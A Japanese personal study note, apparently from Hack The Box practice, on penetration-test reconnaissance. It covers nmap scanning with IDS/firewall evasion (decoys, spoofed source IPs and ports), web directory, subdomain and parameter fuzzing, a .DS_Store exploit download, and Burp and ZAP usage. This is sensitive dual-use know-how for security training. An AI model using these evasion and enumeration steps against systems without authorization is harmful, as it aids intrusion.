
# Enumeration (列挙)

面倒なのでIPを設定して以下のコマンドを行う
```sh
echo -e '\nexport Target_IP=""' >> ~/.bashrc
source ~/.bashrc
```

## ネットワーク範囲内でホストの列挙
どのホストが生きているかだけをまず知る必要がある
- ポートスキャンは行わない場合は、-snオプション
```sh
nmap -sn 10.10.110.0/24
```

うまくいかない時は、fping
```sh
fping -asgq 172.16.1.0/24
```

## ホスト・OSベースの列挙

### ターゲットのOSを知る
```bash
ping -c 1 $Target_IP
````

- ttlの時間で判別する
    - `ttl=64` → Linux OS/Mac OS
    - `ttl=128` → Windows OS
    - `ttl=255` → UNIX OS/ネットワーク機器


### ターゲットの詳細なOSを知る
OpenSSHのバージョンを検索して、OSの詳細なバージョンを知る。
opensshのバージョンは、こんな感じで出てくる
```shell-session
sudo nmap -v -sCV -T4 -p0-65535 -Pn $Target_IP
```
「OpenSSH 8.2p1 Ubuntu 4ubuntu0.1」を検索
「launchpad.net」というサイトの中で、Ubuntu SSHパッケージの変更ログから、「openssh 1:8.2p1-4ubuntu0.1」とわかる
「ubuntuupdates.org」というサイトの中で「Release:	focal (20.04)」から、対象のOSはUbuntu 20.04とわかる。
→古いバージョンの OS に新しいアプリケーション パッケージをインストールすることも可能だから、あまり信用しすぎない。


### Nmapポートスキャン
HTB用
ペネトレーションテストとかだと、`-T2`とかにする。
```sh
echo -e '\nexport Target_IP=""' >> ~/.bashrc
source ~/.bashrc
```

```bash
sudo nmap -p0-65535 -T4 -Pn -v --open $Target_IP -oG open_ports.txt
ports=$(grep "Ports:" open_ports.txt | awk -F'Ports: ' '{print $2}' | tr ',' '\n' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
sudo nmap -sCV -A -Pn -p"$ports" -vv $Target_IP
```

| オプション               | 説明                                                                                                                                                                                                               |
| ------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| -sS                 | 上位1000のTCPポートをスキャン<br>生のTCPパケットを作成するために必要なソケット権限から、root権限が必要                                                                                                                                                     |
| -sT                 | デフォルトのスキャン方法 (TCP Connectスキャン)<br>TCP 3 ウェイ ハンドシェイクを使用して、ターゲット ホストの特定のポートが開いているか閉じているかを判断<br>スキャンは`SYN`パケットをターゲットポートに送信<br>ターゲットポートが`SYN-ACK`パケットで応答する場合はオープン<br>`RST`パケットで応答する場合はクローズド<br>ログに残りやすいが、確実な結果が返ってくる |
| -p-                 | 全ポート(1～65535)をスキャン- `-p0-65535` は 0～65535 までスキャンするので、ポート0も含まれる点が異なる                                                                                                                                              |
| -F                  | 上位100ポートのみをスキャン- スキャン範囲が少ないため高速                                                                                                                                                                                  |
| --top-ports=10      | 上位10ポートのみをスキャン                                                                                                                                                                                                   |
| -p XX               | 指定されたポート(XX)のみをスキャン                                                                                                                                                                                              |
| --packet-trace      | 送受信されたすべてのパケットを表示                                                                                                                                                                                                |
| -n                  | DNS解決を無効にする                                                                                                                                                                                                      |
| --disable-arp-ping  | ARP pingを無効にする                                                                                                                                                                                                   |
| --max-retries       | Nmapがターゲットから応答がなくて再試行する上限回数(デフォルトでは10)                                                                                                                                                                           |
| -Pn                 | ICMPエコー要求を無効                                                                                                                                                                                                     |
| -sU                 | UDPスキャン                                                                                                                                                                                                          |
| -sV                 | サービスバージョンを検出する<br>各ポートで動作しているサービスのバージョン情報を取得しようとする                                                                                                                                                               |
| -sC                 | Nmapのデフォルトスクリプトを実行する<br>サービス検出や脆弱性スキャンが行われることがある                                                                                                                                                                 |
| -sCV                | -sCと-sVを実行                                                                                                                                                                                                       |
| -vvv                | 詳細な出力を有効化する（デバッグ情報を増やす）<br>`-v` で基本的な詳細情報を表示、`-vv` でより詳細、`-vvv` で最も詳細な出力                                                                                                                                         |
| -oN                 | `.nmap`ファイル拡張子でのデフォルトでの保存                                                                                                                                                                                        |
| -oG                 | `.gnmap`ファイル拡張子を持つGrepable出力                                                                                                                                                                                     |
| -oX                 | `.xml`ファイル拡張子を持つXML出力                                                                                                                                                                                            |
| -oA                 | 結果を上の3つのすべての形式で保存する                                                                                                                                                                                              |
| --stats-every=5s    | ステータスを表示する間隔を決められる                                                                                                                                                                                               |
| --min-rate 300      | 毎秒同時に送信するパケットの最小数を設定<br>ネットワーク帯域幅がわかっていれば、送信されるパケットのレートで作業でき、スキャンが大幅に高速化できる<br>しかし、普通は難しいので`-T4`とかを使えばいい                                                                                                         |
| -D RND:5            | 接続元のIPを示す5つのランダムなIPアドレスを生成する                                                                                                                                                                                     |
| --script banner.nse | Nmapが認識する各ポートについて、ポートに接続し、そこからできる限りの情報を収集する                                                                                                                                                                      |

応答種類

| **状態**             | **説明**                                                                                                  |
| ------------------ | ------------------------------------------------------------------------------------------------------- |
| `open`             | これは、スキャンされたポートへの接続が確立されていることを示しています。これらの接続は、**TCP接続**、**UDPデータグラム**、および**SCTPアソシエイション**にすることができます。      |
| `closed`           | ポートが閉じていると表示されると、TCPプロトコルは、受信したパケットに`RST`フラグが含まれていることを示します。このスキャン方法は、ターゲットが生きているかどうかを判断するためにも使用できます。    |
| `filtered`         | Nmapは、ポートのターゲットから応答が返されないか、ターゲットからエラーコードが取得されるため、スキャンされたポートが開いているか閉じられているかを正しく識別できません。                  |
| `unfiltered`       | このポートの状態は、**TCP-ACK**スキャン中にのみ発生し、ポートにアクセスできることを意味しますが、開いているか閉じているかを判断することはできません。                        |
| `open\|filtered`   | 特定のポートの応答が得られない場合、`Nmap`はその状態に設定します。これは、ファイアウォールまたはパケットフィルターがポートを保護する可能性があることを示しています。                   |
| `closed\|filtered` | この状態は、**IP ID**の**アイドル**スキャンでのみ発生し、スキャンされたポートがファイアウォールによって閉じられているかフィルタリングされているかを判断することは不可能であることを示しています。 |

#### スクリプトエンジン
こんな感じで使える
```shell-session
snowyowl644@htb[/htb]$ sudo nmap <target> --script <category>
```
なんかWindows系のサービスは結構`vuln`つけてやったりしてるよね
こんな感じで`--script "サービス名*"`って感じでね
```
nmap -p 80 --script "http-*" 10.129.241.215
```

| カテゴリ          | 説明                                                          |
| ------------- | ----------------------------------------------------------- |
| **auth**      | 認証情報（ユーザー名やパスワードなど）を特定するためのスクリプト                            |
| **broadcast** | ブロードキャストを利用してホスト探索を行い、発見されたホストを自動的に残りのスキャンに追加するスクリプト        |
| **brute**     | ブルートフォース攻撃を用いて対象サービスへのログインを試行するスクリプト                        |
| **default**   | `-sC` オプションで実行されるデフォルトのスクリプト                                |
| **discovery** | アクセス可能なサービスを評価・検出するスクリプト                                    |
| **dos**       | DoS (サービス妨害) 脆弱性をチェックするスクリプト。サービスに悪影響を及ぼす可能性があるため頻繁には使用されない |
| **exploit**   | スキャン対象ポートの既知の脆弱性を悪用しようとするスクリプト                              |
| **external**  | 外部のサービスを利用して追加情報を得るためのスクリプト                                 |
| **fuzzer**    | 様々なフィールドに異なる値を送信して、予期しない動作や脆弱性を発見するためのスクリプト。処理に時間がかかる場合がある  |
| **intrusive** | ターゲットシステムに悪影響を及ぼす可能性のある侵入的なスクリプト                            |
| **malware**   | 対象システムがマルウェアに感染していないかをチェックするスクリプト                           |
| **safe**      | 侵入的・破壊的でない、安全に実行できるスクリプト                                    |
| **version**   | サービス検出（バージョン情報など）を拡張するスクリプト                                 |
| **vuln**      | 特定の脆弱性を確認・検出するスクリプト                                         |
#### レポート作成
- ちなみに、XML出力を使用すると、技術に詳しくない人でも読みやすいHTMLレポートを簡単に作成できる
- 結果を詳細に明確に提示するため、後でドキュメント作成に非常に役立つ
- 保存された結果をXML形式からHTMLに変換するには、ツール`xsltproc`が使える
```shell-session
xsltproc target.xml -o target.html
```

#### 小技
- スキャン中に`[Space Bar]`を押すと、スキャンステータスが出力される

#### Firewallとルールの確認
- TCPポートはフィルタリングしてても、UDPポートをフィルタリングされてないことがあるので-sUも試す
	- UDPはステートレスプロトコルなので、スキャンもタイムアウトもはるかに長くなる
-  TCP ACK(`-sA`)スキャンは、一般的な SYNスキャン (`-sS`) や Connectスキャン (`-sT`) と比べて、ブロックされにくい
	- ACKスキャンは **「ポートが開いているか閉じているか」を正確に知る手段** というよりも、**「ファイアウォールでフィルタされているかどうか」を調べる**手段
- フィルタリングに引っかかったパケットは「ドロップ (無視)」されるか、「リジェクト (拒否)」されるかのいずれか

例
```shell-session
sudo nmap $Target_IP -p<空いてるポート> -sU -Pn -n --disable-arp-ping --packet-trace
```

```shell-session
sudo nmap $Target_IP -p<空いてるポート> -sA -Pn -n --disable-arp-ping --packet-trace
```

```shell-session
sudo nmap $Target_IP -n -Pn -p445 -O
```
#### IPS/IDSの検知
- ファイアウォールとそのルールとは異なり、IDS/IPSシステムはパッシブトラフィック監視システムであるため、検出がはるかに困難
- `IDS systems`ホスト間のすべての接続を検査します。IDSが定義されたコンテンツまたは仕様を含むパケットを見つけた場合、管理者に通知され、最悪の場合に適切な措置を取られる
- 判断する手法
	- 異なるIPアドレスを持つ複数の仮想プライベートサーバー（`VPS`）を使う
		- もう最初から複数のIPを用意しておいて、試してみる
		- ブロックされたら「しゃあない、IPS/IDSあるんかい！じゃあ、他のIPで！」って感じでやるしかないらしい。
	- そして、別の`VPS`で侵入テストを続ける
- 検知された時の流れ
	- 検知された時に、まず攻撃元IPアドレスがブロックされる
	- その結果、インターネットサービスプロバイダーに連絡されて、インターネットへのすべてのアクセスがブロックされる

##### IPS/IDSの回避？(撹乱)
- **Decoy（デコイ）スキャン（`-D`）の利用**
    - Nmap は送信元を偽装するために、IPヘッダに複数のランダムなIPアドレスを混在させる機能
    - `-D RND:5` のように指定すると、5つのランダムIPを生成し、自分の本当のIPアドレスを混ぜる
- DecoyのIPは実際に応答がある“生きている”IPの方がいい
    - しかし、ランダム機能（RND:x）を使用すると、必ずしも“生きている”アドレスが選ばれる保証はない。
    - Decoyに指定するIPは、できる限り「応答が確認できる実在ホスト」を使うほうが効果的。
    - その結果、フィルタリングや偽装失敗のリスクが高まるので、もし可能なら **「応答があるデコイIP」を手動設定するのが理想**

```shell-session
sudo nmap $Target_IP -p- -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
```
- なりすましされたパケットは、同じネットワーク範囲から来ている場合でも、ISPやルーターによって除外されることがよくある
- なので、VPSサーバーのIPアドレスを指定し、IPヘッダーの「`IP ID`」操作と組み合わせて使用してターゲットをスキャンすることもできる
- 別のシナリオは、個々のサブネットのみがサーバーの特定のサービスにアクセスできないこと
	- そのため、ソースIPアドレス（`-S`）を手動で指定して、これでより良い結果が得られるかどうかをテストすることもできる
```shell-session
sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200
```

#### DNSプロキシによる回避
- **Nmapの動作とDNS**
    - 通常、Nmapはデフォルトで逆引き（Reverse DNS）を行う
    - 従来はUDPの53番ポートでDNS問い合わせをするのが一般的だったが、最近はDNSSECやIPv6の導入でTCPの53番ポートを使うケースも増えている
- **DNSサーバーの指定**
    - `--dns-server <サーバー1>,<サーバー2>` としてDNSサーバーを手動設定する
    - DMZのような環境では、内部DNSサーバーを使うことで企業内部のホストと通信しやすくなる（外部よりも信頼されている）
- **送信元ポートを53番として偽装**
    - `--source-port 53` を指定すると、Nmapが送るパケットの“送信元”が53番ポートになる。
    - ファイアウォールやIDS/IPSが「53番ポートからの通信＝DNSトラフィック」として許可している場合、セキュリティルールをすり抜けられる可能性がある
```shell-session
sudo nmap $Target_IP -p<空いてるポート> -sS -Pn -n -sV --disable-arp-ping --packet-trace --source-port 53
```


#### 回避テクニック詰め込みコマンド
- 上のテクニックを全部詰め込んだ
- 末尾最初は`-F`とかですかねえ〜
- それで、**空いてるポートがわかったら、`-p`で指定してもいい**と思うんだけど、そもそも`-F`にないポートがクリティカルだとだるいのであんまり信頼しすぎないように。(未来の自分へ、フラグ立てとくね🏴‍☠️

UDP

```shell-session
sudo nmap $Target_IP -sU -Pn -n -vvv -A --disable-arp-ping --packet-trace -D RND:5 --source-port 53 -oA "scan_output" -T2 -F
```

TCP
```shell-session
sudo nmap $Target_IP -sA -Pn -sCV -vvv --n --disable-arp-ping --packet-trace -D RND:5 --source-port 53 -oA "scan_output" -T2 -F
```

ポートがわかったなら、これでも取得できる
```shell-session
snowyowl644@htb[/htb]$ ncat -nv --source-port 53 10.129.2.28 50000
```


### EyeWitness
- EyeWitnessは Nmap および Nessus のXML出力を読み取る
- Seleniumを使ってさまざまなポート上に存在するWebアプリケーションのスクリーンショット付きレポートを自動生成するツール
- さらにEyeWitnessは、以下のことも実行できる
	- アプリケーションの分類（可能な範囲で）
	- 指紋（ファインガープリンティング）による識別
	- 対象アプリケーションに対する既定の認証情報（デフォルトクレデンシャル）の提案
	- IPアドレスやURLのリストを受け取り、http:// や https:// を自動で付加
	- DNS解決の実行
	- 接続およびスクリーンショットを試みる特定のポートの指定も可能

インストール方法
```sh
sudo apt install eyewitness
```

実行方法
```sh
nano targets.txt
nmap -p 80,443,8000,8080,8180,8888,10000 --open -iL targets.txt -oX web_discovery.xml
```
オプションの確認
- `eyewitness -h`を実行すると、使用可能なオプション一覧が表示される
- `--web`オプションを使用して、NmapのXML出力を入力としてスクリーンショットを取得してみる
```shell-session
eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
```
- EyeWitnessは対象ホストに対して自動でHTTPリクエストを送り、接続に成功したWebアプリケーションのスクリーンショットを取得し、レポートにまとめてくれる
- 取得されたスクリーンショットは、指定したディレクトリ（ここでは inlanefreight_eyewitness）にHTML形式で保存され、ブラウザで確認可能なレポートとして出力される

### Aquatone
- Aquatone は EyeWitness に似たツール
- ホストの一覧が記載された .txt ファイルや、`-nmap`フラグを指定した Nmap の .xml ファイルを入力として使用することで、Webページのスクリーンショットを取得

インストール
- 解凍後の aquatone バイナリを PATH に通った場所（例：/usr/local/bin）に移動すれば、どこからでもコマンドとして実行できる
```shell-session
wget https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
unzip aquatone_linux_amd64_1.7.0.zip 
```

- web_discovery.xml（Nmap出力ファイル）をAquatoneに渡して実行する
```shell-session
cat web_discovery.xml | ./aquatone -nmap
```



## Web系
### Nikto
とりあえずNikto!!!! Microsoft IMSみたいな何もないようなサイトでもやる！！！！！
```sh
nikto -h http://
```
.DS_Store見つかったら
```sh
wget https://github.com/lijiejie/ds_store_exp/raw/refs/heads/master/ds_store_exp.py
pip install ds-store requests
python ds_store_exp.py http://10.13.38.11/.DS_Store
```



- 特定のページにアクセスできる隠しファイルやフォルダを見つけるのに最適
### Feroxbuster 
えぐいディレクトリスキャナー
一つの隠しフォルダ見つけたら、その中で再起的にディレクトリスキャンしてくれる
```bash
feroxbuster -u <http://TARGET>
```

### Dirsearch
HTBにはdirsearch入ってないので、dirsearchを入れるところから
```bash
sudo apt install dirsearch -y
```

両方大事
```bash
dirsearch -u <domain> -t 50 -i 200
```

```bash
sudo dirsearch --url=http://popcorn.htb --wordlist=/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --threads 30 --random-agent --format=simple
```

### ffuf
##### Tips
- `-mc 200`で、フィルタリングしてるのに、全部200でバーっと出てくる時は、`-fs`でサイズでフィルタリングするといい感じになる
#### サブドメインのファジング
- 使える辞書(サイズが小さい順)
	- `/opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
	- `/usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt`
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://<domain> -H "Host: FUZZ.<domain>" -mc 200
```
 - 注意点としては、サブドメインにも、hostsで設定しないとサーバーエラーになる

ちなみに、dnsゾーン転送が許可されている場合は、サブドメインが表示されることもある
```
dig axfr inlanefreight.local @10.129.229.147
```


以下の方法もある
```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
     -u http://zynect.zishuieng.com/ \
     -H "Host: FUZZ.zishuieng.com" \
     -mc 200,301,302,403 \
     -t 5 \
     -p 0.2
```

#### ディレクトリのファジング
```sh
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ
```

#### 拡張子のファジング
ディレクトリファジングができた手もサイトの拡張子がわからない時があるので、拡張子をファジングする
- 拡張子がわかったら、ページ名だけでファジングすることによって、より効率よくページをファジングできる
```shell-session
ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
```

#### ページのファジング
```shell-session
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.<拡張子のファジングでわかった拡張子>
```

#### 再帰的ファジング
feroxbusterみたいに、ディレクトリとフォルダをいっぺんにファジングできる
- `-recursion-depth 1`: サブディレクトリ1階層分までスキャン
- 拡張子を指定する場合は `-e .php`
	- 結果が多くなるので -v を使ってURLを明確に表示するのが便利
```shell-session
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
```

```sh
feroxbuster -u http://faculty.academy.htb:57022/ -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,phps,php7
```
#### VHOST(仮想ホスト)
仮想ホストとサブドメインの違い
- 同じIPアドレスでも、**Hostヘッダ**によって表示される内容を切り替える
- Apache や Nginx が「Host: admin.academy.htb」を見て処理を変えてる
```shell-session
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
```

#### パラメータファジング
- URLの中の「?param=value」のような部分の「param」を探すこと
- 非公開パラメータが見つかることがあり、セキュリティ上の弱点に繋がることもある
- 今回のターゲット
	- `http://admin.academy.htb:PORT/admin/admin.php`
	- アクセスすると「You don't have access to read the flag」と表示される
		- → 何か認証的なチェックをしている
		- → 特定のパラメータを送ることでアクセスできるかも？
- ffufを使って使用しているパラメータをファジングする

**GETパラメータ**
```shell
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
```

**POSTパラメータ**
- POSTとGETの違い
	- GET：URLに「?param=value」とつけてパラメータを渡す
	- POST：パラメータはリクエストボディ（本文）に含まれ、URLには出ない
	- → POSTでは `-d` オプションで本文データを指定する必要がある
	- あと、Content-Typeを必ず指定する
```shell-session
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

スキャン結果が出たら、curlで確認する
- レスポンスに「Invalid id!」というエラーメッセージが出た
	- → `id` というパラメータが**有効**であり、**何らかの値のチェックが行われている**
```shell-session
curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'
```


#### 値のファジング
- なにをするの？
	- 有効なパラメータ（例：`id`）がわかったら、今度はその「値（value）」を総当たりで試す
	- 例：`id=1`, `id=2`, `id=3`, ... のように試して、フラグが表示されるIDを探す！
- なぜ難しい？
	- パラメータの「値」は決まった形式（数字、文字列、UUIDなど）がある
	- 既存のワードリストでは合わないこともあるので、自分でリストを作ることも多い

辞書作り
```shell-session
for i in $(seq 1 1000); do echo $i >> ids.txt; done
```

ファジング
```shell-session
ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```


### VHOST（仮想ホスト）の列挙

```bash
gobuster vhost -u http://$Target_IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

### Whatweb
```
whatweb <http://...>
```
便利なツールであり、ネットワーク全体の Web アプリケーションの列挙を自動化する多くの機能を備えている
```shell-session
whatweb --no-errors 10.10.10.0/24
```

### robots.txt
robots.txtが見つかったら、disallowに注目する


### Certificate Transparency Logsとは

- インターネットの信頼性を確保するために、SSL/TLS証明書の発行を記録する **公開の不変ログ** 。
- 証明書の誤発行や悪意ある発行を防ぎ、透明性を提供。

- 不正な証明書の早期発見
    - CT Logsを監視することで、不正または誤発行された証明書を迅速に検出できる。
    - これにより、不正証明書が悪用される前に対処可能。
- 認証局（CA）の透明性と説明責任
    - CAがルールに違反した証明書を発行すると、CT Logsに記録され、監視・制裁対象となる。
    - CAの信頼性を確保し、不正発行を防ぐ。
- Web PKIの強化
    - Web PKI（公開鍵基盤）のセキュリティと整合性を強化。
    - 誰でも証明書の発行履歴を確認できることで、安全なオンライン通信を確保
#### 情報収集
- **サブドメイン列挙に有効**
    - 従来の **ブルートフォース** や **ワードリスト** に依存せず、**実際に発行された証明書** を基にサブドメインを特定可能。
    - **歴史的な記録も確認可能** → 既に使われていないサブドメインも発見できる。
    - **推測が難しいサブドメインも見つかる** → 例えば、"secure.dev.example.com" などの隠れたサブドメインも特定可能。
- **脆弱性調査に活用**
    - 古い/期限切れの証明書を持つサブドメインは、**脆弱な設定** や **未保守のソフトウェア** をホストしている可能性がある。
    - これにより、攻撃者が悪用できる潜在的なエントリポイントを発見できる。

| **ツール**    | **主な特徴**                        | **用途**           | **メリット**         | **デメリット**      |
| ---------- | ------------------------------- | ---------------- | ---------------- | -------------- |
| **crt.sh** | シンプルなWebインターフェース、ドメイン検索、証明書詳細表示 | サブドメイン特定、証明書履歴確認 | 無料・登録不要・簡単       | フィルタリング機能が限定的  |
| **Censys** | 高度な検索機能、フィルタリング、API提供           | 証明書の詳細分析、誤設定検出   | 強力なデータ分析機能、API対応 | 登録が必要（無料プランあり） |

```shell-session
curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[]
 | select(.name_value | contains("dev")) | .name_value' | sort -u
```

- `curl -s "https://crt.sh/?q=facebook.com&output=json"`：このコマンドは、domainfacebook`facebook.com`に一致する証明書のJSON出力をcrt.shから取得する。
- `jq -r '.[] | select(.name_value | contains("dev")) | .name_value'`：このパートでは、JSON結果をフィルタリングし、`name_value`フィールド（ドメインまたはサブドメインを含む）に文字列「`dev`」が含まれているエントリのみを選択します。`-r`フラグは、生の文字列を出力するように`jq`に指示する
- `sort -u`：これにより、結果をアルファベット順に並べ替え、重複が削除される

### EyeWitness
ターゲットWebアプリケーションのスクリーンショットを撮り、指紋を取得し、可能なデフォルトの資格情報を識別するために使用できる
https://github.com/RedSiege/EyeWitness


## フィンガープリントの収集
### Nikto

```bash
nikto -h http://<IP・ドメイン>
```

- `curl -I `
	- webサーバーの情報を取得する
	- リダイレクトがあるかとかを調べられる
```shell-session
curl -I inlanefreight.com
```

### WAF があるかを確認する
- `wafw00f`
	- Webアプリケーションファイアウォール（WAF）の識別に特化したコマンドラインツール。
	- WAFの有無や種類、設定情報を特定可能。
```shell-session
pip3 install git+https://github.com/EnableSecurity/wafw00f
```

```shell-session
wafw00f <ドメイン>
```

## クローラー
#### Scrapy
- サイト内部の情報を詳細に収集するのに適したツール
- **Feroxbuster** は「サイトのディレクトリ構造や隠れたファイルを発見する」のに適している。
- **Scrapy** は「詳細な情報収集（スクレイピング）」や「データを整理して保存する」目的に向いている。
インストール
```shell-session
pip3 install scrapy
```

```shell-session
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
```

```shell-session
unzip ReconSpider.zip 
```

実行
- データはJSONファイル`results.json`に保存される
- なんかサイト内の情報をjsonでまとめてくれるのはいいこと
	- emailとかlinkとかを集めてくれるんはガチで助かる
	- コメント集めてくれるのガチで熱い！！！
```shell-session
python3 ReconSpider.py http://ドメイン
```

#### `robots.txt`を無視する方法
デフォルトだと、robots.txtを遵守する設定になってる
だけど、robots.txtを遵守して欲しくない時の設定
普通にあるものは全て見たいよね

Scrapyの設定（`settings.py` または `custom_settings`）で、以下のオプションを設定すると、`robots.txt`のルールを無視できる

```python
ROBOTSTXT_OBEY = False  # robots.txt を無視
```

また、Scrapyのスクリプト内で設定を変更する場合は、以下のようにカスタム設定を適用できる

```python
import scrapy

class MySpider(scrapy.Spider):
    name = "my_spider"
    allowed_domains = ["example.com"]
    start_urls = ["https://example.com"]

    custom_settings = {
        'ROBOTSTXT_OBEY': False  # robots.txt を無視
    }

    def parse(self, response):
        # ここでデータを処理
        pass
```

## Webプロキシ
BurpとZAP、どちらを使うべき？
- 結論としては、どちらのツールも覚えておくと便利
	- 状況に応じて使い分けができるようになる
- お金をかけたくない場合や、自由度の高いテストがしたい場合はZAP
- より成熟した機能や、企業向けの高度なペンテストをしたい場合はBurp Pro

自分の目的や環境に合ったツールを選べばOKです。
### BurpSuite
- ターミナルから起動 : `burpsuite`

**ダークテーマを使いたい時**
　User Options > Display > Theme にて「dark」を選択

**リクエストの自動切り替え**
- 設定場所：`Proxy > Options > Match and Replace`
- 例：
	- Type: `Request header`
	- Match: `^User-Agent.*$`（正規表現）
	- Replace: `User-Agent: HackTheBox Agent 1.0`
	- Regex: `True`

**Encoding / Decoding（エンコードとデコード）**
- 対象文字を選択 → 右クリック → `Convert Selection > URL > URL encode key characters`
	- または、選択して `CTRL+U`
	- リアルタイムエンコードもONにできる（右クリックで切替）
- `Decoder` タブで使う
	- 最新版では `Inspector`（Repeater/Proxy にもある）でも可能

Metasploitでもプロキシ使える
```sh
msfconsole
use auxiliary/scanner/http/robots_txt
set PROXIES HTTP:127.0.0.1:8080
set RHOST SERVER_IP
set RPORT PORT
run
```

nmapでもプロキシ使える
```sh
nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC
```

**Burp IntruderでWebファジングする流れ**
- Burp Intruderとは？
	- Burp Suiteに搭載されたファジング／ブルートフォースツール
	- ページ・ディレクトリ・パラメータなどを自動で試せる
	- 無料版は1秒に1リクエストなので遅い（短時間の調査向き）

- 基本的な使い方
	- Proxyで送信されたリクエストをIntruderに送る（Ctrl+I）
	- Intruderタブで設定を順に行う

- 設定ステップ
	- Target
		- リクエスト先の情報を確認（自動で入力されている）
	- Positions
		- ワードリストを差し込む場所に `§` をつける
		- 例：`GET /§DIRECTORY§/` → ディレクトリ列挙
		- Attack Typeは「Sniper」（初心者向けの基本設定）
	- Payloads
		- Simple Listを選ぶ（ワードリストを1行ずつ使用）
		- 「Load」からリストを読み込む（例：common.txt）
		- Payload Processingで条件付きのスキップが可能（例：`.`で始まる行を除外）
		- Encodingは通常ON（URLエンコードされる）
	- Options
		- Grep - Match：`200 OK` を追加 → 成功レスポンスを強調
		- その他は初期設定のままでOK

- 実行と結果確認
	- 「Start Attack」で攻撃スタート
	- ステータスコード（200 OK）やレスポンス長を見て有効なパスを特定
	- `/admin` などが見つかったら、次の調査ターゲットに！

- 攻撃者の視点で注目すべき点
	- ステータス200 OK → 実在するディレクトリやページの可能性
	- レスポンス長が他と違う → 何か特別な処理があるかも
	- `/admin` や `/login` は高確率で重要なページ！
- 注意点
	- 無料版は遅い → 本格的なスキャンには不向き
	- 巨大なワードリストを使うとメモリ負荷が高くなる
	- スキャン対象が許可された環境か必ず確認！

**Burp Scanner (Proのみ)**
- Burp Scannerとは？
	- Burp Suite Proに搭載されたWeb脆弱性スキャナー
	- クローリング（サイト構造の把握）＋脆弱性スキャン（パッシブ＆アクティブ）
	- 無料版では使えないが、非常に強力でプロ向けの機能

- スキャンの基本ステップ
	- スコープ設定（スキャン対象URLの指定）
		- 対象のURLを右クリック →「Add to scope」
		- logoutなど危険な処理は「Remove from scope」で除外
	- クローリング（Crawler）
		- Webページ内のリンクやフォームをたどって構造をマッピング
		- 「Crawl and Audit」を選ぶとクローリング後にスキャンも実行
	- パッシブスキャン（Passive Scan）
		- 新たなリクエストは送らず、既存レスポンスから脆弱性を検出
		- XSS、CSPの欠如、HTML構造の問題などを静的に検出
	- アクティブスキャン（Active Scan）
		- 実際に攻撃リクエストを送って脆弱性を検証
			- XSS, SQLi, コマンドインジェクションなど
		- スコープ内すべてを対象に、詳細な検査を実施

- 攻撃者視点で注目すべき点
	- スキャン結果の「High（重大）」＋「Certain（確実）」に注目
		- 実際に再現できる深刻な脆弱性の可能性あり
	- 例：OSコマンドインジェクションがHigh/Firmで検出された場合
		- 該当リクエストのペイロードとレスポンスを確認し、影響を判断

- レポート機能
	- スキャン後に自動レポート作成可能（HTMLで出力）
		- 深刻度や確信度でフィルタ可能
		- 修正方法や再現方法（PoC）も含まれる
	- そのまま提出せず、自分の分析＋整理後の資料として活用


**Burp Suiteの拡張**
- Extenderタブ → BApp Store から導入可能
- 人気順でソートして便利な拡張を探せる
	- Pro専用のものも一部あり（大半は無料）
- インストール例：Decoder Improved
	- MD5やBase64など、拡張エンコード機能を追加
- 拡張にJythonなどの依存モジュールが必要な場合もある
- その他おすすめ拡張（一部）
	- Active Scan++：スキャンの強化
	- Retire.JS：脆弱なJSライブラリ検出
	- Autorize：認可バイパスのチェック
	- CMS Scanner：WordPressなどCMS特化スキャナ
### OwaspZAP
- Burpと並ぶもうひとつの代表的なWebプロキシツール
- OWASPが主導するオープンソースプロジェクトで、完全無料。Burpのような有料機能は一切ない
- ZAPもBurpと同様に、基本機能から高度な機能まで幅広く提供されている
- ZAPにはBurpにない強みもある
- ダウンロードページ : https://www.zaproxy.org/download/

ターミナルから起動 : `zaproxy`
**ダークテーマを使いたい時**
　Tools > Options > Display > Look and Feel から「Flat Dark」を選択

**リクエストの自動切り替え**
- 設定場所：`Tools > Options > Replacer`
- 例：
	- Match Type: `Request Header`
	- Match String: `User-Agent`
	- Replacement: `HackTheBox Agent 1.0`
	- Enable: `True`

**Encoding / Decoding（エンコードとデコード）**
